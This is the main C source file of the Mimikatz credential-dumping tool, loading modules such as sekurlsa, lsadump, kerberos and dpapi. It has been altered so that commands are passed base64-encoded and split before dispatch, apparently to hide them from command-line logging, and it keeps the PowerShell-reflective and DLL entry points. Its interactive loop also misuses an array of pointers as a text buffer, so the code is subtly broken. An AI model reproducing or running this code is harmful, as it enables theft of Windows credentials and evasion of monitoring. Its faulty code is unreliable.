/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimikatz.h"

const KUHL_M * mimikatz_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_ngc,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
	&kuhl_m_sr98,
	&kuhl_m_rdm,
	&kuhl_m_acr,
};


unsigned char decode_base64_char(wchar_t ch) {
	if (ch >= L'A' && ch <= L'Z') return ch - L'A';
	if (ch >= L'a' && ch <= L'z') return ch - L'a' + 26;
	if (ch >= L'0' && ch <= L'9') return ch - L'0' + 52;
	if (ch == L'+') return 62;
	if (ch == L'/') return 63;
	return 0xFF; // Invalid Base64 character
}

// Function to decode Base64 input and return a wide character string
wchar_t* base64_decode(const wchar_t* input) {
	if (input == NULL) return NULL;

	size_t input_len = wcslen(input);
	if (input_len == 0) return NULL;

	// Calculate the size of the decoded data
	size_t output_len = input_len / 4 * 3;
	if (input[input_len - 1] == L'=') output_len--;
	if (input[input_len - 2] == L'=') output_len--;

	// Allocate memory for the output buffer (including null-terminator)
	wchar_t* output = (wchar_t*)malloc((output_len + 1) * sizeof(wchar_t));
	if (output == NULL) return NULL;

	size_t i, j;
	unsigned char b[4], d[3];

	for (i = 0, j = 0; i < input_len; i += 4) {
		b[0] = decode_base64_char(input[i]);
		b[1] = decode_base64_char(input[i + 1]);
		b[2] = decode_base64_char(input[i + 2]);
		b[3] = decode_base64_char(input[i + 3]);

		d[0] = (b[0] << 2) | (b[1] >> 4);
		d[1] = (b[1] << 4) | (b[2] >> 2);
		d[2] = (b[2] << 6) | b[3];

		output[j++] = d[0];
		if (b[2] != 0xFF) output[j++] = d[1];
		if (b[3] != 0xFF) output[j++] = d[2];
	}

	output[j] = L'\0'; // Null-terminate the output string

	return output;
}

// Function to free the memory allocated for the decoded string
void free_decoded_string(wchar_t* decoded_str) {
	free(decoded_str);
}

void split_wchar_string_by_quotes(wchar_t* decoded_str, wchar_t* decoded_strs[], int* num_strings) {
	int max_strings = 10; // 假设最多有10个子字符串
	*num_strings = 0;     // 初始化子字符串数量

	// 遍历原始字符串
	while (*decoded_str != L'\0' && *num_strings < max_strings) {
		// 跳过前导空格
		while (*decoded_str == L' ') {
			decoded_str++;
		}

		// 判断是否已经到达字符串末尾
		if (*decoded_str == L'\0') {
			break;
		}

		// 如果以双引号开头，将双引号内的内容作为一个子字符串
		if (*decoded_str == L'"') {
			decoded_str++; // 跳过开头的双引号
			wchar_t* start = decoded_str; // 记录子字符串的起始位置

			// 寻找双引号结束位置
			while (*decoded_str != L'"' && *decoded_str != L'\0') {
				decoded_str++;
			}

			// 计算子字符串的长度
			size_t length = decoded_str - start;

			// 分配内存并复制子字符串到decoded_strs数组中
			decoded_strs[*num_strings] = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
			wcsncpy_s(decoded_strs[*num_strings], length + 1, start, length);
			decoded_strs[*num_strings][length] = L'\0';

			(*num_strings)++;

			// 跳过双引号结尾和可能存在的空格
			if (*decoded_str == L'"') {
				decoded_str++;
			}
		}
		else {
			// 如果不以双引号开头，则按空格分割字符串
			wchar_t* start = decoded_str; // 记录子字符串的起始位置

			// 寻找空格或字符串末尾作为子字符串结束位置
			while (*decoded_str != L' ' && *decoded_str != L'\0') {
				decoded_str++;
			}

			// 计算子字符串的长度
			size_t length = decoded_str - start;

			// 分配内存并复制子字符串到decoded_strs数组中
			decoded_strs[*num_strings] = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
			wcsncpy_s(decoded_strs[*num_strings], length + 1, start, length);
			decoded_strs[*num_strings][length] = L'\0';

			(*num_strings)++;
		}
	}
}
//
//void split_wchar_string_by_space(wchar_t* decoded_str, wchar_t* decoded_strs[], int* num_strings) {
//	int max_strings = 10; // 假设最多有10个子字符串
//	*num_strings = 0;     // 初始化子字符串数量
//
//	// 遍历原始字符串
//	while (*decoded_str != L'\0' && *num_strings < max_strings) {
//		// 跳过前导空格
//		while (*decoded_str == L' ') {
//			decoded_str++;
//		}
//
//		// 判断是否已经到达字符串末尾
//		if (*decoded_str == L'\0') {
//			break;
//		}
//
//		// 记录子字符串的起始位置
//		wchar_t* start = decoded_str;
//
//		// 寻找子字符串的结束位置（遇到空格或字符串末尾）
//		while (*decoded_str != L' ' && *decoded_str != L'\0') {
//			decoded_str++;
//		}
//
//		// 计算子字符串的长度
//		size_t length = decoded_str - start;
//
//		// 分配内存并复制子字符串到decoded_strs数组中
//		decoded_strs[*num_strings] = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
//		wcsncpy_s(decoded_strs[*num_strings], length + 1, start, length);
//		decoded_strs[*num_strings][length] = L'\0';
//
//		(*num_strings)++;
//	}
//}

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#if !defined(_POWERKATZ)
	size_t len;
	wchar_t input[0xffff];
#endif

	// Decode the Base64 input
	wchar_t* decoded_str = base64_decode(argv[1]);

	wchar_t* decoded_strs[10]; // 假设最多有10个子字符串
	int num_strings;

	split_wchar_string_by_quotes(decoded_str, decoded_strs, &num_strings);


	mimikatz_begin();
	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < num_strings) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
	{
		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", decoded_strs[i]);
		status = mimikatz_dispatchCommand(decoded_strs[i]);
	}
#if !defined(_POWERKATZ)
	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
	{
		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
		if(fgetws(decoded_strs, ARRAYSIZE(decoded_strs), stdin) && (len = wcslen(decoded_strs)) && (decoded_strs[0] != L'\n'))
		{
			if(decoded_strs[len - 1] == L'\n')
				decoded_strs[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", decoded_strs);
			status = mimikatz_dispatchCommand(decoded_strs);
		}
	}
#endif
	mimikatz_end(status);
	return STATUS_SUCCESS;
}

void mimikatz_begin()
{
	kull_m_output_init();
#if !defined(_POWERKATZ)
	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	kprintf(L"\n"
		L"  .#####.   " MIMIKATZ_FULL L"\n"
		L" .## ^ ##.  " MIMIKATZ_SECOND L" - (oe.eo)\n"
		L" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n"
		L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
		L"  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n");
	mimikatz_initOrClean(TRUE);
}

void mimikatz_end(NTSTATUS status)
{
	mimikatz_initOrClean(FALSE);
#if !defined(_POWERKATZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#if !defined(_WINDLL)
	if(status == STATUS_THREAD_IS_TERMINATING)
		ExitThread(STATUS_SUCCESS);
	else ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimikatz_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_POWERKATZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimikatz_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if(mimikatz_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				if(mimikatz_modules[indexModule]->description)
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if(mimikatz_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			if(mimikatz_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

#if defined(_WINDLL)
void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;

	AllocConsole();
#pragma warning(push)
#pragma warning(disable:4996)
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	freopen("CONIN$", "r", stdin);
#pragma warning(pop)
	if(lpszCmdLine && lstrlenW(lpszCmdLine))
	{
		if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
		{
			wmain(argc, argv);
			LocalFree(argv);
		}
	}
	else wmain(0, NULL);
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;